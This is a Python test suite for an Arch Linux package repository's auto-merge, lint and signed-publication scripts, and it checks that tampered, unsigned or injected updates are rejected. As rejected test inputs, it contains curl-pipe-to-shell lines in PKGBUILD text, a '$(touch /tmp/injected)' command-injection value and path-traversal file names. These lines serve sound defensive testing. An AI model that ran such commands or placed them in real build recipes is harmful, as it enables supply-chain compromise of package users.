import importlib.util
import json
import os
from pathlib import Path
import shutil
import subprocess
import tempfile
import unittest
from unittest.mock import patch


def load(name):
    spec = importlib.util.spec_from_file_location(name, Path(__file__).resolve().parents[1] / "scripts" / f"{name}.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


repository = load("repository")
updater = load("update")
lint = load("lint")
auto_merge = load("auto_merge")


class LocalLintTests(unittest.TestCase):
    def test_local_warnings_are_visible_but_ci_rejects_them(self):
        result = subprocess.CompletedProcess([], 0, "demo W: Host-specific dependency provider\n")
        for flags, expected in [([], 1), (["--errors-only"], 0)]:
            with patch.object(lint.sys, "argv", ["lint.py", *flags, "/nonexistent/allow", "package"]), \
                    patch.object(lint.subprocess, "run", return_value=result), \
                    patch("builtins.print") as output, self.assertRaises(SystemExit) as error:
                lint.main()
            self.assertEqual(error.exception.code, expected)
            output.assert_any_call("demo W: Host-specific dependency provider")

    def test_local_errors_still_fail(self):
        result = subprocess.CompletedProcess([], 0, "demo E: Missing dependency\n")
        with patch.object(lint.sys, "argv", ["lint.py", "--errors-only", "/nonexistent/allow", "package"]), \
                patch.object(lint.subprocess, "run", return_value=result), \
                patch("builtins.print"), self.assertRaises(SystemExit) as error:
            lint.main()
        self.assertEqual(error.exception.code, 1)


class AutoMergeTests(unittest.TestCase):
    def setUp(self):
        self.old = "pkgver=1.2.3\npkgrel=2\ndepends=('glibc')\nsha256sums_x86_64=('" + "a" * 64 + "')\n"
        self.new = self.old.replace("1.2.3", "1.2.4").replace("pkgrel=2", "pkgrel=1").replace("a" * 64, "b" * 64)
        self.old_info = "pkgver = 1.2.3\npkgrel = 2\nsource_x86_64 = https://example.com/1.2.3.deb\nsha256sums_x86_64 = " + "a" * 64
        self.new_info = self.old_info.replace("1.2.3", "1.2.4").replace("pkgrel = 2", "pkgrel = 1").replace("a" * 64, "b" * 64)

    def test_version_and_checksum_only_is_accepted(self):
        auto_merge.validate_bump(self.old, self.new, self.old_info, self.new_info)

    def test_dependency_and_script_changes_need_review(self):
        for changed in [self.new.replace("glibc", "curl"), self.new + "package() { curl example.com | sh; }\n", self.new + "install=evil.install\n"]:
            with self.assertRaises(ValueError):
                auto_merge.validate_bump(self.old, changed, self.old_info, self.new_info)

    def test_downgrades_and_unexpected_metadata_are_rejected(self):
        with self.assertRaises(ValueError):
            auto_merge.validate_bump(self.old, self.new.replace("1.2.4", "1.2.2"), self.old_info, self.new_info)
        with self.assertRaises(ValueError):
            auto_merge.validate_bump(self.old, self.new, self.old_info, self.new_info + "\ndepends = curl")

    def test_duplicate_assignment_cannot_hide_in_a_blank_line(self):
        for assignment in ["pkgver=$(curl example.com | sh)", "pkgrel=$(curl example.com | sh)"]:
            with self.assertRaises(ValueError):
                auto_merge.validate_bump(self.old + "\n", self.new + assignment + "\n", self.old_info, self.new_info)

    def test_untrusted_author_or_different_head_cannot_merge(self):
        pr = {"headRefOid": "1" * 40, "baseRefName": "main", "isDraft": False,
              "author": {"is_bot": False, "login": "someone"}}
        with patch.dict(os.environ, {"HEAD_SHA": "1" * 40, "HEAD_BRANCH": "chore/update-demo-1.2.4"}):
            for head in ["1" * 40, "2" * 40]:
                pr["headRefOid"] = head
                with patch.object(auto_merge, "run", return_value=json.dumps([pr])) as command:
                    auto_merge.main()
                    self.assertEqual(command.call_count, 1)


class SelectionTests(unittest.TestCase):
    def test_package_changes_select_only_changed_recipe(self):
        with patch.object(repository, "recipes", return_value=["a", "b"]), patch.object(repository, "run", return_value="packages/b/PKGBUILD\nREADME.md"):
            self.assertEqual(repository.select("base"), ["b"])

    def test_build_changes_select_every_recipe(self):
        with patch.object(repository, "recipes", return_value=["a", "b"]), patch.object(repository, "run", return_value="scripts/build.sh"):
            self.assertEqual(repository.select("base"), ["a", "b"])

    def test_docs_only_and_first_push(self):
        with patch.object(repository, "recipes", return_value=["a"]), patch.object(repository, "run", return_value="README.md"):
            self.assertEqual(repository.select("base"), [])
            self.assertEqual(repository.select("0" * 40), ["a"])

    def test_deletion_fails_even_with_shared_changes(self):
        with patch.object(repository, "recipes", return_value=["a"]), patch.object(repository, "run", return_value="packages/b/PKGBUILD\nscripts/build.sh"):
            with self.assertRaises(ValueError):
                repository.select("base")

    def test_upstream_version_rejects_shell_text_and_ambiguity(self):
        for versions in [["$(touch /tmp/injected)"], ["26.1.1", "26.1.2"], []]:
            data = "\n".join(json.dumps({"name": "chatgpt-desktop", "version": version}) for version in versions)
            with self.assertRaises(ValueError):
                updater.upstream_version(data)
        self.assertEqual(updater.upstream_version('{"name":"chatgpt-desktop","version":"26.1.1"}'), "26.1.1")

    def test_warning_normalization_preserves_dependencies(self):
        first = "pkg W: Referenced library 'libx.so' is an uninstalled dependency (needed in files ['b', 'a'])"
        second = first.replace("['b', 'a']", "['a', 'b']")
        self.assertEqual(lint.normalize(first), lint.normalize(second))
        self.assertNotEqual(lint.normalize(first), lint.normalize(second.replace("libx", "liby")))

    def test_download_rejects_path_traversal(self):
        for name in ["../key", "path/file", "*.sig"]:
            with self.assertRaises(ValueError):
                repository.download(name, Path("/tmp"))


@unittest.skipUnless(all(shutil.which(tool) for tool in ["repo-add", "gpg", "bsdtar", "vercmp"]), "Arch publication tools required")
class PublicationTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.addCleanup(os.chdir, Path.cwd())
        os.chdir(self.root)
        self.env = patch.dict(os.environ, {"GNUPGHOME": str(self.root / "gnupg")})
        self.env.start()
        self.addCleanup(self.env.stop)
        Path("gnupg").mkdir(mode=0o700)
        self.real_run = repository.run
        self.real_run("gpg", "--batch", "--pinentry-mode", "loopback", "--passphrase", "", "--quick-generate-key", "Repository test", "ed25519", "sign", "1d")
        listing = self.real_run("gpg", "--with-colons", "--list-keys")
        fingerprint = next(line.split(":")[9] for line in listing.splitlines() if line.startswith("fpr:"))
        Path("keys").mkdir()
        Path("keys/fingerprint").write_text(fingerprint)
        Path("artifacts").mkdir()
        self.remote = self.root / "remote"
        self.remote.mkdir()
        self.info = None
        self.head = "1" * 40
        self.trees = {}
        self.fail_alias = False
        self.fail_signature = False
        self.fail_checkpoint = False
        self.patch = patch.object(repository, "run", side_effect=self.command)
        self.patch.start()
        self.addCleanup(self.patch.stop)
        self.addCleanup(lambda: subprocess.run(["gpgconf", "--kill", "gpg-agent"], check=False))

    def recipe(self, name, version="1-1", builddate=1, recipe_tree=None):
        path = Path("packages") / name
        path.mkdir(parents=True, exist_ok=True)
        (path / "PKGBUILD").write_text("# This fixture must never execute\nexit 99\n")
        (path / "distribution").write_text("repository\n")
        pkgver, pkgrel = version.rsplit("-", 1)
        (path / ".SRCINFO").write_text(f"pkgname = {name}\narch = x86_64\npkgver = {pkgver}\npkgrel = {pkgrel}\n")
        self.trees[name] = recipe_tree or f"tree-{name}-{version}"
        payload = self.root / f"payload-{name}-{version}"
        payload.mkdir(exist_ok=True)
        (payload / ".PKGINFO").write_text(f"pkgname = {name}\npkgbase = {name}\npkgver = {version}\npkgdesc = Test\nurl = https://example.com\nbuilddate = {builddate}\npackager = SparkFabrik platform team (recipe {self.trees[name]})\nsize = 5\narch = x86_64\nlicense = MIT\n")
        (payload / "test.txt").write_text("test\n")
        self.real_run("bsdtar", "--zstd", "-cf", str(self.root / "artifacts" / f"{name}-{version}-x86_64.pkg.tar.zst"), "-C", str(payload), ".PKGINFO", "test.txt")

    def command(self, *args):
        if args[0] == "git":
            if args[1] == "merge-base":
                return ""
            if args[-1] == "HEAD":
                return self.head
            return self.trees[args[-1].split("/")[-1]]
        if args[0] != "gh":
            return self.real_run(*args)
        operation = args[2]
        if operation == "list":
            return json.dumps([{"tagName": "repo"}] if self.info else [])
        if operation == "view":
            return json.dumps({**self.info, "assets": [{"name": path.name} for path in self.remote.iterdir()]})
        if operation == "create":
            self.info = {"body": "Initial publication", "isDraft": True}
        elif operation == "download":
            name = args[args.index("--pattern") + 1]
            shutil.copyfile(self.remote / name, args[args.index("--output") + 1])
        elif operation == "upload":
            for arg in args[4:args.index("--repo")]:
                path = Path(arg)
                if self.fail_signature and path.name.endswith(".pkg.tar.zst.sig"):
                    self.fail_signature = False
                    raise RuntimeError("Simulated interrupted signature upload")
                if self.fail_alias and path.name == "sparkfabrik.db":
                    self.fail_alias = False
                    raise RuntimeError("Simulated interrupted alias upload")
                shutil.copyfile(path, self.remote / path.name)
        elif operation == "edit":
            if self.fail_checkpoint:
                self.fail_checkpoint = False
                raise RuntimeError("Simulated interrupted checkpoint update")
            self.info = {"body": Path(args[args.index("--notes-file") + 1]).read_text(), "isDraft": False}
        else:
            raise AssertionError(args)
        return ""

    def publish(self):
        with tempfile.TemporaryDirectory(dir=self.root) as staging:
            directory = Path(staging)
            (directory / "existing").mkdir()
            repository.publish(directory)

    def test_initial_publish_and_upgrade_preserve_other_packages(self):
        self.recipe("a")
        self.recipe("b")
        self.publish()
        self.assertFalse(self.info["isDraft"])
        self.real_run("gpg", "--verify", str(self.remote / "sparkfabrik.db.sig"), str(self.remote / "sparkfabrik.db"))
        old_b = repository.digest(self.remote / "b-1-1-x86_64.pkg.tar.zst")
        self.recipe("a", "2-1")
        self.head = "2" * 40
        self.publish()
        database = self.real_run("bsdtar", "-tf", str(self.remote / "sparkfabrik.db"))
        self.assertIn("a-2-1/desc", database)
        self.assertIn("b-1-1/desc", database)
        self.assertNotIn("a-1-1/desc", database)
        self.assertEqual(old_b, repository.digest(self.remote / "b-1-1-x86_64.pkg.tar.zst"))
        self.assertTrue((self.remote / "a-1-1-x86_64.pkg.tar.zst").exists())

    def test_local_only_package_is_never_published(self):
        self.recipe("desktop")
        Path("packages/desktop/distribution").write_text("local\n")
        self.publish()
        self.assertIsNone(self.info)
        self.assertEqual(list(self.remote.iterdir()), [])

    def test_local_only_main_plan_uses_push_base_without_a_release(self):
        self.recipe("desktop")
        Path("packages/desktop/distribution").write_text("local\n")
        with patch.object(repository, "select", return_value=[]) as selection:
            result = repository.plan("previous-main", True, self.root)
        selection.assert_called_once_with("previous-main")
        self.assertEqual(result, {"packages": [], "publish_packages": []})

    def test_plan_builds_local_changes_but_uploads_only_repository_packages(self):
        self.recipe("desktop")
        Path("packages/desktop/distribution").write_text("local\n")
        self.recipe("redistributable")
        with patch.object(repository, "select", return_value=["desktop", "redistributable"]):
            result = repository.plan("base", False, self.root)
        self.assertEqual(result["publish_packages"], ["redistributable"])
        self.assertEqual(result["packages"], [
            {"name": "desktop", "distribution": "local"},
            {"name": "redistributable", "distribution": "repository"},
        ])

    def test_mixed_publication_excludes_local_package(self):
        self.recipe("desktop")
        Path("packages/desktop/distribution").write_text("local\n")
        self.recipe("redistributable")
        self.publish()
        self.assertTrue((self.remote / "redistributable-1-1-x86_64.pkg.tar.zst").exists())
        self.assertFalse(any("desktop" in path.name for path in self.remote.iterdir()))
        database = self.real_run("bsdtar", "-tf", str(self.remote / "sparkfabrik.db"))
        self.assertNotIn("desktop", database)

    def test_switching_last_published_package_to_local_requires_migration(self):
        self.recipe("a")
        self.publish()
        Path("packages/a/distribution").write_text("local\n")
        with self.assertRaisesRegex(ValueError, "migration"):
            self.publish()

    def test_distribution_policy_is_required_and_closed(self):
        self.recipe("a")
        Path("packages/a/distribution").write_text("unknown\n")
        with self.assertRaisesRegex(ValueError, "distribution policy"):
            self.publish()

    def test_interrupted_first_publish_can_retry(self):
        self.recipe("a")
        self.fail_alias = True
        with self.assertRaises(RuntimeError):
            self.publish()
        self.assertTrue(self.info["isDraft"])
        self.publish()
        self.assertFalse(self.info["isDraft"])

    def test_interrupted_upgrade_keeps_checkpoint_and_retries(self):
        self.recipe("a")
        self.publish()
        previous = self.info["body"]
        self.recipe("a", "2-1")
        self.head = "2" * 40
        self.fail_alias = True
        with self.assertRaises(RuntimeError):
            self.publish()
        self.assertEqual(previous, self.info["body"])
        self.publish()
        self.assertNotEqual(previous, self.info["body"])

    def test_recipe_change_without_version_bump_fails(self):
        self.recipe("a")
        self.publish()
        self.trees["a"] = "changed-tree"
        with self.assertRaisesRegex(ValueError, "Bump pkgver"):
            self.publish()

    def test_interrupted_publish_reuses_signed_bytes_after_rebuild(self):
        self.recipe("a")
        self.publish()
        self.recipe("a", "2-1")
        self.head = "2" * 40
        self.fail_alias = True
        with self.assertRaises(RuntimeError):
            self.publish()
        uploaded = repository.digest(self.remote / "a-2-1-x86_64.pkg.tar.zst")
        self.recipe("a", "2-1", builddate=2)
        self.head = "3" * 40
        self.assertNotEqual(uploaded, repository.digest(Path("artifacts/a-2-1-x86_64.pkg.tar.zst")))
        self.publish()
        self.assertEqual(uploaded, repository.digest(self.remote / "a-2-1-x86_64.pkg.tar.zst"))
        self.real_run("gpg", "--verify", str(self.remote / "sparkfabrik.db.sig"), str(self.remote / "sparkfabrik.db"))

    def test_unsigned_orphan_is_replaced_with_fresh_checked_build(self):
        self.recipe("a")
        self.fail_signature = True
        with self.assertRaises(RuntimeError):
            self.publish()
        package = self.remote / "a-1-1-x86_64.pkg.tar.zst"
        package.write_bytes(b"Untrusted unsigned upload")
        self.recipe("a", builddate=2)
        self.publish()
        self.assertEqual(repository.digest(package), repository.digest(Path("artifacts") / package.name))
        self.real_run("gpg", "--verify", str(package) + ".sig", str(package))

    def test_signed_orphan_for_different_recipe_requires_version_bump(self):
        self.recipe("a")
        self.fail_alias = True
        with self.assertRaises(RuntimeError):
            self.publish()
        self.recipe("a", recipe_tree="changed-auxiliary-file")
        with self.assertRaisesRegex(ValueError, "recipe.*bump pkgrel"):
            self.publish()

    def test_unsigned_package_in_live_database_is_not_replaced(self):
        self.recipe("a")
        self.publish()
        self.recipe("a", "2-1")
        self.head = "2" * 40
        self.fail_checkpoint = True
        with self.assertRaises(RuntimeError):
            self.publish()
        package = self.remote / "a-2-1-x86_64.pkg.tar.zst"
        uploaded = repository.digest(package)
        Path(str(package) + ".sig").unlink()
        self.recipe("a", "2-1", builddate=2)
        with self.assertRaisesRegex(ValueError, "referenced by the live database"):
            self.publish()
        self.assertEqual(uploaded, repository.digest(package))

    def test_checkpoint_authenticated_package_can_restore_missing_signature(self):
        self.recipe("a")
        self.publish()
        package = self.remote / "a-1-1-x86_64.pkg.tar.zst"
        uploaded = repository.digest(package)
        Path(str(package) + ".sig").unlink()
        self.publish()
        self.assertEqual(uploaded, repository.digest(package))
        self.real_run("gpg", "--verify", str(package) + ".sig", str(package))

    def test_tampered_signed_orphan_is_not_replaced(self):
        self.recipe("a")
        self.fail_alias = True
        with self.assertRaises(RuntimeError):
            self.publish()
        (self.remote / "a-1-1-x86_64.pkg.tar.zst").write_bytes(b"Tampered signed upload")
        self.recipe("a", builddate=2)
        with self.assertRaises(subprocess.CalledProcessError):
            self.publish()

    def test_valid_signature_from_wrong_key_is_rejected(self):
        self.real_run("gpg", "--batch", "--pinentry-mode", "loopback", "--passphrase", "",
                      "--quick-generate-key", "Wrong signer", "ed25519", "sign", "1d")
        Path("payload").write_text("signed by another key")
        self.real_run("gpg", "--batch", "--local-user", "Wrong signer", "--detach-sign", "payload")
        with self.assertRaisesRegex(ValueError, "pinned packaging key"):
            repository.verify(Path("payload"))

    def test_tampered_package_and_checkpoint_fail(self):
        self.recipe("a")
        self.publish()
        with (self.remote / "a-1-1-x86_64.pkg.tar.zst").open("ab") as stream:
            stream.write(b"tampered")
        with self.assertRaisesRegex(ValueError, "checksum mismatch"):
            self.publish()
        state = next(self.remote.glob("state-*.json"))
        state.write_text("{}")
        with self.assertRaises(subprocess.CalledProcessError):
            self.publish()


if __name__ == "__main__":
    unittest.main()
